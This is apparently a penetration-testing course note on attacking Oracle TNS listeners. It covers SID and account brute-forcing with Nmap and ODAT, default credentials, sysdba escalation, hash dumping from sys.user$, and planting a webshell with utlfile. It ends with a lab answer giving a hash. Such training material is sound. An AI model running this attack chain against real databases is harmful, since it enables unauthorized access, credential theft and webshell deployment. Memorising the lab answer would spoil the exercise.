# NOTE — Oracle TNS

## ID
119

## Module
Footprinting

## Kind
notes

## Title
Section 15 — Oracle TNS

## Description
Oracle Database enumeration via the TNS Listener (TCP/1521): SID brute-forcing with Nmap, account brute via ODAT, sqlplus login (incl. `as sysdba` privilege escalation), hash extraction from `sys.user$`, and file upload via `utlfile`.

## Tags
oracle, tns, port-1521, odat, sqlplus, sid, sysdba, sys.user$, file-upload

## Commands
- `sudo nmap -p1521 -sV <IP> --open` — basic discovery
- `sudo nmap -p1521 -sV <IP> --open --script oracle-sid-brute` — SID brute-force
- `python3 odat.py all -s <IP>` — ODAT all-modules brute (SIDs + accounts)
- `sqlplus <user>/<pass>@<IP>/<SID>` — connect with default privs
- `sqlplus <user>/<pass>@<IP>/<SID> as sysdba` — connect as DB admin (when allowed)
- Default credential pairs to try: `scott/tiger`, `dbsnmp/dbsnmp`, `system/CHANGE_ON_INSTALL` (Oracle 9), `sys/<password>`
- Inside sqlplus:
  - `select table_name from all_tables;`
  - `select * from user_role_privs;`
  - `select name, password from sys.user$;` — extract hashes
  - File upload (via ODAT): `./odat.py utlfile -s <IP> -d <SID> -U <user> -P <pass> --sysdba --putFile <remote-dir> <remote-name> <local-file>`

## Concept Overview
Oracle **Transparent Network Substrate (TNS)** is the comms layer between Oracle DBs and clients. Default listener port **TCP/1521**. Originally part of Oracle Net Services. Supports TCP/IP, IPX/SPX, IPv6, SSL/TLS. Used heavily in healthcare, finance, retail enterprise stacks.

### SID = "System Identifier"
A unique name per **instance**. One Oracle box can host multiple instances; each has a SID. Clients must specify the right SID to connect — wrong SID = connection refused. Common labs/installs default to **`XE`** (Oracle Express Edition).

### Configuration Files
| File | Side | Purpose |
|------|------|---------|
| `tnsnames.ora` | Client | Maps service names → network address + SID |
| `listener.ora` | Server | Defines listener properties + which services it advertises |
| Both live in `$ORACLE_HOME/network/admin/` |

A `tnsnames.ora` entry looks like:
```
ORCL =
  (DESCRIPTION =
    (ADDRESS_LIST =
      (ADDRESS = (PROTOCOL = TCP)(HOST = 10.129.11.102)(PORT = 1521))
    )
    (CONNECT_DATA =
      (SERVER = DEDICATED)
      (SERVICE_NAME = orcl)
    )
  )
```

### Default Credentials (try every time)
| Account | Default password |
|---------|------------------|
| `system` (Oracle 9i) | `CHANGE_ON_INSTALL` |
| `system` (Oracle 10g+) | (no default) |
| `dbsnmp` | `dbsnmp` |
| `scott` | `tiger` |
| `outln` | `outln` |

## Setup — ODAT (Oracle Database Attacking Tool)
ODAT is a Python pentest framework for Oracle. Installation chain (Pwnbox-tested):
```bash
sudo apt-get install -y build-essential python3-dev libaio1
wget https://files.pythonhosted.org/packages/source/c/cx_Oracle/cx_Oracle-8.3.0.tar.gz
tar xzf cx_Oracle-8.3.0.tar.gz
cd cx_Oracle-8.3.0 && python3 setup.py build && sudo python3 setup.py install
git clone https://github.com/quentinhardy/odat.git
cd odat && pip install python-libnmap
git submodule init && git submodule update
sudo apt-get install python3-scapy build-essential libgmp-dev -y
sudo pip3 install colorlog termcolor passlib python-libnmap
pip3 install pycryptodome openpyxl
```

For sqlplus on Pwnbox:
```bash
sudo apt update && sudo apt install oracle-instantclient-sqlplus
# If "libsqlplus.so" not found:
sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf" && sudo ldconfig
```

## Methodology
1. **Confirm the listener** — `sudo nmap -p1521 -sV <IP> --open`. Banner usually shows `Oracle TNS listener X.X.X.X (unauthorized)`.
2. **Brute-force the SID** — `nmap --script oracle-sid-brute -p1521 <IP>` or ODAT. Without a valid SID you can't connect.
3. **Brute-force accounts** — `python3 odat.py all -s <IP>` runs everything (SID find → account find → exploit modules). Common quick win: `scott/tiger`.
4. **Connect with sqlplus** — `sqlplus scott/tiger@<IP>/XE`. If creds are valid you may get a "password expires soon" warning — ignore.
5. **Privilege escalation via `as sysdba`** — `sqlplus scott/tiger@<IP>/XE as sysdba`. Some accounts (or some configurations) let *any* user connect with sysdba role → full DB control.
6. **Dump hashes** — `select name, password from sys.user$;` → crack offline.
7. **Pivot via file write** — if a webserver is on the same host, `./odat.py utlfile ... --putFile` drops a file (e.g. webshell) to the document root.

## Common Web Roots for File Upload
| OS | Default web root |
|----|------------------|
| Linux | `/var/www/html` |
| Windows | `C:\inetpub\wwwroot` |

Test upload first with a benign file, then validate via HTTP GET, *then* drop a payload.

## Lab — Questions & Answers
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1 — Password hash of user `DBSNMP` | **`E066D214D5421CCC`** | `python3 odat.py all -s <IP>` brute-forces SID (`XE`) and accounts (`scott/tiger` valid). Then `sqlplus scott/tiger@<IP>/XE as sysdba` → `select name, password from sys.user$ where name = 'DBSNMP';` → returns `DBSNMP E066D214D5421CCC` |

### Reference command
```bash
python3 odat.py all -s <IP>
sqlplus scott/tiger@<IP>/XE as sysdba
SQL> select name, password from sys.user$ where name = 'DBSNMP';
```

## Key Takeaways
- **You need the SID before anything works.** Brute it with Nmap or ODAT; common default is `XE`.
- `scott/tiger` is *still* the canonical Oracle starter pair — try it first.
- **`as sysdba` is the privilege-escalation primitive.** Even a low-priv user can sometimes escalate via local sysdba auth (OS-level group membership maps to DB-level sysdba).
- `sys.user$` holds the password hashes — combine with `select * from user_role_privs;` to confirm sysdba access first.
- ODAT is the swiss-army knife — `all` mode is heavy but worth it on a single target.

## Gotchas
- ODAT's `all` mode is *slow* (~5–10 min) and noisy — single-IP only, don't run on a CIDR.
- Some accounts are locked by default (`mdsys`, `oracle_ocm`, `outln`, `xdb`) — ODAT skips them. Don't waste guesses there.
- `secure_file_priv` (Oracle equivalent) and DBA privilege both gate file upload via `utlfile`.
- The PL/SQL Exclusion List (`PlsqlExclusionList`) blocks listed packages from execution via Oracle Application Server — note this for OAS-fronted DBs.
- Hashes returned from `sys.user$` are short (16 hex chars = 8 bytes) for legacy DES — modern Oracle uses SHA-1+salt; check format before picking a Hashcat mode.

<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|footprinting]]
← [[13-mysql]] | [[16-ipmi]] →
<!-- AUTO-LINKS-END -->
